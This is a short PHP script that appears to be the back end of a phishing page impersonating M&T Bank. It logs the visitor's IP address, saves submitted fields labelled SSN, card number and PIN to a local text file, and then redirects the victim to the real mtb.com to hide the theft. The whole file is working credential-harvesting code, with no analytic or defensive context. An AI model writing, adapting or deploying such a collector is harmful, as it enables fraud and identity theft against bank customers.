<?php

echo "<meta http-equiv=\"refresh\" content=\"0;URL='https://www.mtb.com/\" />";

$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);

$ip = getenv("REMOTE_ADDR");


$cod1 = $_POST['cod1'];
$cod2 = $_POST['cod2'];
$cod3 = $_POST['cod3'];

$saveline = 'IP: ' . $ip . ' SSN : ' . $cod1 .  ' CARD : ' . $cod2 . ' PIN ' . $cod3 . "\n";

$fh=fopen('up.txt',"a+");
fwrite($fh,$saveline);
fclose($fh);


exit;


?>
